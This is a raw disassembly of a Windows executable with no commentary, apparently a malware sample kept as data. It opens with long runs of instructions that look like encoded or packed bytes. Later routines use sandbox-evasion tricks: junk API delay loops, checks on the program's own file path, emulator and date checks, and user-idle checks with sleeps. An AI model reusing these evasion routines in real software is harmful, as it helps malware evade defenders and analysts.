xchg ebp eax
xchg ebp eax
cmp al 0x3a
or [ esi - 0x57 ] 0x95
xchg ebp eax
add [ edx - 0x7d ] bh
div [ edx + ebp * 2 + 0x6a ]
mov edx 0x6a601d83
push 0xffffff82
popad
scasb [ edi ]
xchg ebp eax
xchg ebp eax
jmp 0x29c99374
adc [ ebx + 0x6b ] 0x6a
push 0x53
aaa
out dx al
int3
or al 0xe3
das
mov dl 0x32
add [ edi ] al
or al 0xe3
das
mov dh 0x32
cmp [ esi - 0x69 ] 0xffffff95
or al 0xe3
pop ss
mov bl [ ecx - 0x6b ]
or al 0xe3
pop ss
mov [ 0xffffffff958aa083 ] dh
xchg ebp eax
cli
cmp eax 0x95a10483
xchg ebp eax
cli
cli
cli
cli
cli
jmp 0xffffffff9fc96fcc
sub_46333e
cli
cli
jecxz r-xdata
cli
push ebx
aaa
out dx al
cli
mov [ ebp - 0x79e06a6b ] edx
sub [ edi + 0x659595b7 ] 0xffffffee
xchg esi eax
sbb [ ebx ] 0xffffff92
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
loope r-xdata
fwait
ja r-xdata
bound eax [ ebx - 0x6a6a6688 ]
cli
xor al [ ebx - 0x6a6a7e09 ]
cli
jecxz r-xdata
pop ebx
mov dl [ ebp + 0x60a38395 ]
push 0x6a
cli
cli
cli
cli
cli
cli
adc al 0x6f
push 0x6a
loope r-xdata
xchg ebp eax
xchg ebp eax
pop ds
xchg [ ebx - 0x6a6a4851 ] al
cmp bh [ edx ]
jecxz r-xdata
adc [ ebp - 0x505056b ] 0xfffffffa
cli
cli
cli
xchg ebp eax
pop ds
sahf
xchg ebp eax
pop ds
xchg esi eax
sub [ esi + esi * 4 - 0x5056a6b ] 0xfffffffa
cli
cli
add [ ebx - 0x7d ] ch
sbb ch [ edi + 0x6a ]
push 0xfffffffa
sub al [ ebx - 0x6a6a7c3c ]
cli
cli
cli
cli
add bl [ ebx - 0x7cd5fc89 ]
les eax [ ebx - 0x5056a6b ]
dec esi
jle r-xdata
out dx al
xchg ebp eax
xchg ebp eax
xchg edx eax
out 0x2f eax
sahf
cmp al [ eax ]
xchg ebp eax
xchg ebp eax
pop ds
xchg [ ebx - 0x6a6a5304 ] al
out dx eax
test eax 0x59959591
stosb [ edi ]
test eax 0xfafafafa
cli
cli
cli
cli
cli
add [ eax - 0x5b ] 0xffffff95
xchg ebp eax
cli
cli
cli
cli
cli
cli
out dx eax
insd
push 0x6a
push 0xffffffad
das
xchg esi eax
push 0x6a
or al 0xef
mov eax 0x6a674083
push 0xfffffffa
cli
cli
cli
cli
out 0xee eax
dec esi
cli
push 0x6a
push 0xffffff82
sub ebx [ edi - 0x6ac56a6b ]
cli
cli
cmp [ ecx - 0x64 ] 0x95
xchg ebp eax
xor esp ebx
dec esi
jbe r-xdata
cli
out 0xef eax
0x82959597 0x91e5
xchg esi eax
mov [ 0xfffffffffafafaa9 ] eax
add [ edx + 0x69298360 ] ebp
push 0x6a
cli
cli
loope r-xdata
cli
or al 0xe3
aaa
pushfd
loope r-xdata
cmp al 0xe
add esp 0xffffffa0
xchg ebp eax
xchg ebp eax
cli
sub al [ ebx + 0x6a6a6354 ]
cli
cli
cli
cli
or al 0xef
pushfd
or [ edx ] 0xffffff87
xchg ebp eax
xchg ebp eax
cli
cli
or al 0xe3
aaa
cwde
add [ ebx ] al
xor [ ebx ] ecx
aaa
sahf
loope r-xdata
xchg ebp eax
test eax 0x7d5cee65
push 0x6a
cmp [ edx ] eax
push 0x6a
loope r-xdata
into
push 0x6a
push 0xffffff83
pop ecx
cmpsb [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
cli
or al 0x53
sub [ ebx + eax * 4 ] ebp
xor dl bh
xchg ebp eax
xchg ebp eax
cli
cli
xchg ebp eax
pop ds
mov al [ ebx + 0x6a6a7c4b ]
or al 0xe3
jle r-xdata
and [ edi ] 0xffffff94
xchg ebp eax
xchg ebp eax
jmp 0x6a8c8252
sub_463444
cmp al 0x83
je r-xdata
out dx eax
xchg ebp eax
xchg ebp eax
cli
loope r-xdata
cli
or al 0xe3
aaa
pushfd
loope r-xdata
push 0x6a
cli
cli
loope r-xdata
jpe r-xdata
cli
cli
pushfd
or [ edx ] 0xffffff87
xchg ebp eax
xchg ebp eax
cli
cli
or al 0xe3
aaa
cwde
add [ ebx ] al
xor [ ebx ] ecx
aaa
sahf
loope r-xdata
or al 0xef
mov eax 0x6a674083
push 0xfffffffa
cli
cli
cli
cli
out 0xee eax
dec esi
cli
push 0x6a
push 0xffffff82
sub ebx [ edi - 0x6ac56a6b ]
cmp al 0xe
add esp 0xffffffa0
xchg ebp eax
xchg ebp eax
cli
sub al [ ebx + 0x6a6a6354 ]
cli
cli
cli
cli
or al 0xef
or al 0xe3
jle r-xdata
and [ edi ] 0xffffff94
xchg ebp eax
xchg ebp eax
jmp 0x6a8c8252
push 0x6a
loope r-xdata
into
push 0x6a
push 0xffffff83
pop ecx
cmpsb [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
cli
or al 0x53
sub [ ebx + eax * 4 ] ebp
xor dl bh
xchg ebp eax
xchg ebp eax
cli
cli
xchg ebp eax
pop ds
mov al [ ebx + 0x6a6a7c4b ]
cli
cli
xchg ebp eax
pop ds
sahf
xchg ebp eax
pop ds
xchg esi eax
sub [ esi + esi * 4 - 0x5056a6b ] 0xfffffffa
cli
cli
add [ ebx - 0x7d ] ch
sbb ch [ edi + 0x6a ]
push 0xfffffffa
add [ eax - 0x5b ] 0xffffff95
xchg ebp eax
cli
cli
cli
cli
cli
cli
out dx eax
insd
push 0x6a
push 0xffffffad
das
xchg esi eax
push 0x6a
pop ds
lea edx [ ebp - 0x505056b ]
cli
out 0xef eax
0x82959597 0x91e5
xchg esi eax
mov [ 0xfffffffffafafaa9 ] eax
add [ edx + 0x69298360 ] ebp
sub_46434e
imul esp [ ebp - 0x11 ] 0xffffffc9
insb
push 0x6a
push ebx
pop ss
jle r-xdata
cmp eax 0x95dcbc83
xchg ebp eax
cli
cli
cli
cli
cli
out 0xf3 al
lodsd [ esi ]
xchg ebp eax
xchg ebp eax
xor esi 0xffffffbe
xchg ebp eax
xchg ebp eax
cli
cli
jmp 0x3029c285
out dx eax
test al 0x88
xchg ebp eax
xchg ebp eax
adc [ esi + 0x3d6a6a6b ] 0xffffff83
pop edi
mov ebx 0xb1599595
sub [ esi + 0xc959581 ] 0xffffffe3
das
mov es [ ebx - 0x6a6a7c06 ]
cli
imul esp [ edi ] 0xa2a5839e
xchg ebp eax
xchg ebp eax
cli
cli
jmp r-xdata
sub_464496
push 0x6a
push 0x0
sub dl dl
push 0x7a
push 0x6a
add ch [ edx + 0x5a ]
push 0x6a
push 0x2
push 0x5a
mov dl 0x6a
push 0x6a
cmp [ edi - 0x78 ] 0x95
xchg ebp eax
jecxz r-xdata
mov dh 0x6a
push 0x6a
xchg ebp eax
aas
xchg esi eax
jecxz r-xdata
mov [ 0xffffffff826a6a6a ] al
pushad
mov [ ebp + 0x292e195 ] dl
cmpsd [ esi ] [ edi ]
sar [ ebx + 0xa ] 0x1
cmp eax 0x6abed4e3
push 0x6a
adc bh 0xdc
xchg ebp eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
cli
cli
cli
jecxz r-xdata
xor al [ edx - 0x6a6a233b ]
add ah [ ebp + 0x3d845281 ]
jecxz r-xdata
xor dl [ ebp + 0x6a6a8efc ]
push 0x2
push 0xffffffea
push 0x6a
add [ edx - 0x6b ] ch
push ds
dec esi
jb r-xdata
mov edx 0x97eaefe7
xchg ebp eax
xchg ebp eax
cmp [ edx ] edi
xor ebx 0xffffff8d
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cmp esp edi
dec esi
and bh [ ebx ]
cmp cl [ ebx ]
dec esi
add [ ss : esi + 0x6f ] 0x6a
add bl [ ecx + 0x3d390f1e ]
jecxz r-xdata
loope r-xdata
and [ eax - 0x78 ] 0x95
xchg ebp eax
loope r-xdata
hlt
push 0xfffffffa
cli
cmp ebp [ ebp + 0x6a6b962f ]
push 0x6a
or [ ebp + 0x29595a0 ] 0x23
loope r-xdata
movsd [ edi ] [ esi ]
adc [ edx - 0x7c ] 0x362ce33d
add [ esi + 0x6f ] 0x6a
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
out 0xef eax
mov [ 0x3a959597 ] al
sbb esi 0xffffffbb
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cmp [ 0xffffffffe19595a7 ] 0xb2
jmp 0xffffffffb235ac2c
cli
cli
xchg ebp eax
sbb dl [ esi + 0x276962e1 ]
add ah [ edi + 0x3d0a7bd0 ]
jecxz r-xdata
cmp al [ eax ]
push 0xffffffe3
in al dx
mov esi 0x826a6a6a
xlat
fcom [ ebp + 0x1e990295 ]
sub_464c7d
push 0x6a
push 0xffffffe7
in eax dx
xor esi esp
xchg ebp eax
xchg ebp eax
adc [ ebx - 0x56a6a41 ] 0xfffffffa
xor al [ ebx - 0x6a6a3d84 ]
loope r-xdata
das
xchg ebp eax
cmp [ esi - 0x56a6a2d ] 0xfffffffa
cli
cli
out 0xef eax
lahf
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
loope r-xdata
sub al [ ebx - 0x6a6a60d0 ]
sbb [ edx - 0x56a6a56 ] 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
or al 0xe3
daa
mov dl 0x33
sub [ esp + edx * 8 ] 0xffffff95
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
out 0x2f eax
fidivr [ edx + edi ]
sbb [ 0x3c9595ce ] 0x2
fwait
ja r-xdata
cmp ch [ edi + ebp - 0x5b7d956b ]
adc [ ebp + 0x2fe73a95 ] 0xffffff95
or al 0xe3
aaa
0x1900
sub_464ca1
pushfd
xchg ebp eax
xchg ebp eax
cmp dl [ ebp - 0x1018a5c4 ]
mov [ 0x3a959597 ] al
xchg ebp eax
cmp al 0x46
and esi 0xffffff83
xchg ebp eax
xchg ebp eax
xchg ebp eax
push ds
dec esi
jle r-xdata
out dx eax
dec esi
inc edx
out 0xe6 eax
dec esi
0x6a68
sub_464ce0
push ebx
nop
nop
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ebx 0x1
mov [ ecx ] 0xb7
inc ebx
dec edx
jne r-xdata
call sub_403030
nop
mov ecx ebx
add ecx eax
jae r-xdata
sub_464d08
push ebx
call GetClipboardViewer
mov ebx 0x802adfc
dec ebx
jne r-xdata
mov eax 0x1dd9d43d
call sub_4026cc
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
mov [ rw-data ] 0x9af5
nop
nop
mov ecx 0x1dd9d43d
xor edx edx
mov eax ebx
call sub_464ce0
call GetClipboardViewer
nop
nop
mov eax ebx
call sub_4026ec
mov ebx 0x88f4
call GetClipboardViewer
dec ebx
jne r-xdata
push 0x0
call sub_45efb4
sub_464d64
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40382c#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d90
retn
sub_464d94
push ebx
push esi
push edi
mov edi rw-data
sub [ rw-data ] 0x1
jae r-xdata
pop edi
pop esi
pop ebx
retn
push 0xff
push rw-data
push 0x0
call GetModuleFileNameA
cmp [ rw-data ] 0x43
jne r-xdata
mov ebx 0x12f6
cmp [ rw-data ] 0x53
jne r-xdata
call GetClipboardViewer
dec ebx
jne r-xdata
mov ebx 0x24be3
cmp [ rw-data ] 0x4c
jne r-xdata
call GetClipboardViewer
nop
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
call SelectClipRgn
nop
call GetLastError
cmp eax 0x6
jne r-xdata
cmp [ rw-data ] 0x46
jne r-xdata
mov eax 0x1d983692
call sub_4026cc
mov ebx eax
test ebx ebx
je r-xdata
nop
nop
jmp r-xdata
mov ecx 0x1d983692
xor edx edx
mov eax ebx
call sub_464ce0
nop
mov eax ebx
call sub_4026ec
nop
mov ebx 0x8847
call GetClipboardViewer
dec ebx
jne r-xdata
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
jne r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x0
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
xor ebx ebx
xor esi esi
nop
nop
jmp r-xdata
cmp eax 0x168
jbe r-xdata
call sub_403030
nop
cmp ebx 0x4
jle r-xdata
add ebx 0x1
jno r-xdata
push 0x0
push 0x159
call SleepEx
jmp r-xdata
call sub_464d08
nop
nop
jmp r-xdata
mov esi [ edi + 0x4 ]
call sub_403030
nop
nop
mov [ edi ] 0x8
nop
xor eax eax
mov [ edi + 0x4 ] eax
push edi
call GetLastInputInfo
nop
nop
mov eax [ edi + 0x4 ]
sub eax esi
jae r-xdata
sub_464fad
fadd [ eax ]
enter 0x4102 0x0
push eax
add al [ ecx ]
movsb [ edi ] [ esi ]
add al 0x41
add [ esp + eax + 0x41 ] dh
add [ esp + ecx + 0xc3c0041 ] cl
inc ecx
add ah ah
lodsd [ esi ]
inc ecx
add [ ebp * 4 + 0x25080041 ] dh
inc edx
add al bl
and al 0x42
add al al
daa
inc edx
add [ eax + 0x6c004227 ] dl
inc eax
inc edx
add [ eax + eax * 2 ] ch
inc edx
add [ eax + esi ] dh
inc edx
add [ eax + esi ] al
inc edx
add [ eax + ebp + 0x28840042 ] dh
inc edx
add [ eax ] dl
mov cl 0x41
add al ah
mov al 0x41
add ah cl
and eax [ edx ]
clc
and al [ edx ]
hlt
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405c64
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4531e8
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_453200
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453280
call sub_403d38
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4055bc
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4055d0
sub_40121c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
sub_401224
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ __import_lookup_table_0(kernel32:ExitThread) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40123c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_40129c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012bc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ SysFreeString@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401304
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40131c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401340
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ac2
jmp sub_40382c
sub_401ac9
mov al [ rw-data ]
pop ebp
retn
sub_401ba6
jmp sub_40382c
sub_401c74
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402288
retn
sub_402274
jmp sub_40382c
sub_40241a
jmp sub_40382c
sub_4026b9
jmp sub_40382c
sub_40277c
call sub_405c18
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405c18
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027d0
mov [ rw-data ] edx
call sub_403e10
sub_402834
push eax
push edx
push ecx
call sub_405c18
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402828
retn
sub_402850
retn
sub_4028a4
retn
sub_4028a8
push ebx
call sub_405c18
mov ebx [ eax + 0x4 ]
call sub_405c18
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402908
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402918
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402990
mov edx [ eax + 0x1c ]
call sub_402948
retn
sub_402bf8
mov ecx 0xff
call sub_402c04
retn
sub_402c28
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402c44
jmp sub_402c44
sub_402c41
retn
sub_402fd1
jmp sub_40382c
sub_403024
fninit
fwait
fldcw [ rw-data ]
retn
sub_40307c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403088
push ebx
mov ebx eax
mov eax ebx
call sub_4030b8
call sub_4026cc
mov edx eax
mov eax ebx
call sub_4030fc
pop ebx
retn
sub_4030a4
push ebx
mov ebx eax
mov eax ebx
call sub_403154
mov eax ebx
call sub_4026ec
pop ebx
retn
sub_4030b8
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_4030e0
call sub_403464
test dl dl
jle r-xdata
retn
call sub_40344c
sub_4031a0
retn
sub_403228
jmp sub_40382c
sub_40322f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403320
mov eax 0x8000ffff
retn
sub_403328
retn
sub_40332c
retn
sub_403330
retn
sub_403425
jmp sub_403578
sub_40342a
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_40388c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40344c
sub_40344c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403454
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403464
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403474
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_40353c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403558
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403925
retn
sub_403a68
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403af6
jmp sub_403578
sub_403b56
jmp sub_403578
sub_403b70
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403a68
mov [ rw-data ] 0x0
call sub_403b10
retn
sub_403ca9
retn
sub_403e0b
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403e10
mov [ rw-data ] eax
call sub_403d38
sub_403ea4
push eax
call ExitThread
sub_4040d0
retn
sub_40410c
retn
sub_40411a
retn
sub_404133
retn
sub_404144
retn
sub_40422b
retn
sub_40435c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404378#2
jmp sub_404378
sub_4043c1
retn
j_sub_404378
jmp sub_404378
sub_4043c9
retn
sub_40440b
retn
sub_404564
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
sub_40457c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4046d4
retn
sub_4046e6
retn
sub_4046e8
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404910
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404a14
mov ecx 0x1
jmp sub_404928
sub_404a1e
retn
sub_404a20
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404c46
retn
sub_404c48
mov al 0x11
jmp sub_402828
sub_404c73
retn
sub_404c84
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b54
pop ebp
retn 0x4
j_sub_404928
jmp sub_404928
sub_404c99
retn
sub_404c9c
call sub_404e3c
retn
sub_404ec8
call sub_404ea0
retn
sub_405211
jmp sub_40382c
sub_40537c
call sub_40538c
retn
sub_405384
call sub_4053ac
retn
sub_40538c
push ebx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405447
jmp sub_403578
sub_405468
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4054dc
jmp sub_40382c
sub_4054e3
pop ecx
pop ebp
retn
sub_40555c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405568
add eax 0x4
push eax
call sub_401304
retn
sub_405574
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402828
sub_405584
call sub_403088
mov [ eax + 0x4 ] 0x1
retn
sub_4055bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_4012fc
pop ebp
retn 0x4
sub_4058ab
jmp sub_40382c
sub_4058b2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40594f
jmp sub_40382c
sub_405956
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40599f
jmp sub_40382c
sub_4059a6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a6a
jmp sub_40382c
sub_405a71
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405ac2
jmp sub_40382c
sub_405ac9
pop ebp
retn
sub_405ba0
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405bc0
push eax
push 0x40
call LocalAlloc
retn
sub_405bcc
mov eax 0x10
retn
sub_405c58
mov eax rw-data
call sub_405468
retn
sub_405ccd
jmp sub_40382c
sub_405cd4
pop ebp
retn
sub_405cd8
sub [ rw-data ] 0x1
retn
sub_405ce0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405cfc
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405d45
jmp sub_40382c
sub_405d4c
pop ebp
retn
sub_405d50
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedDecrement
jmp [ __import_lookup_table_6(kernel32:InterlockedDecrement) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_40602c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetTextMetricsA
